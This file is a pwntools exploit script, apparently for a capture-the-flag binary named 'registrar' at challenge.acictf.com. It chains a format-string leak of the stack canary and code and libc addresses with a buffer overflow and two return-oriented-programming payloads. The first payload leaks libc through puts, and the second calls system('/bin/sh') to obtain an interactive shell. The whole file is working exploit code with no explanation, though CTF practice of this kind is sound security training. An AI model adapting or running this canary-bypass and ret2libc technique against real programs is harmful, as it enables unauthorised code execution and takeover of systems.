from pwn import *
leak_original = 0x00007ffff7dd3780
base_original = 0x00007ffff7a0d000
exit = p64(0x00007ffff7843030)

sh = process('./registrar', raw=False)
#sh = remote('challenge.acictf.com', 59832)
#sh = remote('challenge.acictf.com', 61713)
sh.recvline()
leak_canary = "%19$lx.%28$lx.%4$lx"
#libc_init = %20$lx
#main = %25$lx
sh.sendline(leak_canary)
sh.recvline()
response = sh.recvline()
response = response.strip()
#print(response)
canary = response[0:16]
#print(canary)
canary = int(canary, 16)
start = response[17:29]
#print start
start = int(start, 16)
#print(hex(start))
leak = response[30:]
leak = leak.strip()
leak = int(leak, 16)
#print(hex(leak))
#Calculate GOT addresses
puts = start-0xc0
gets = start - 0x40
exit = start-0x20
read =start -0x6a
gets_got = start+0x201658
pop_rdi = start + 0x3e3
call_rax = start+0x128
main = start + 0x1f9
#Calculate offset
base = base_original
#print(hex(base))
#print(hex(system))

sh.recvuntil("name:")
payload = "a"*72
payload += p64(canary)
payload += "b"*8
payload += p64(pop_rdi)
payload += p64(gets_got)
payload += p64(puts)
payload += p64(main)
sh.sendline(payload)
sh.recvline()
address = sh.recvline()
address = int(unpack(address, 'all', endian = 'little', sign=False))
address = address - 0x000a000000000000
print(hex(address))
#Calculate sytsem and /bin/sh
base = address-0x6ed80
system = base+0x45390
shell = system + 0x1479c7
print sh.recvline()
sh.sendline("%19$lx")
sh.recvline()
canary_2 = sh.recvline()
canary_2 = canary_2.strip()
canary_2 = int(canary_2, 16)
print(hex(canary_2))
sh.recvuntil("name: ")
payload = "a"*72
payload += p64(canary_2)
payload += "b"*8
payload += p64(pop_rdi)
payload += p64(shell)
payload += p64(system)
payload += p64(exit)
sh.sendline(payload)
sh.interactive()
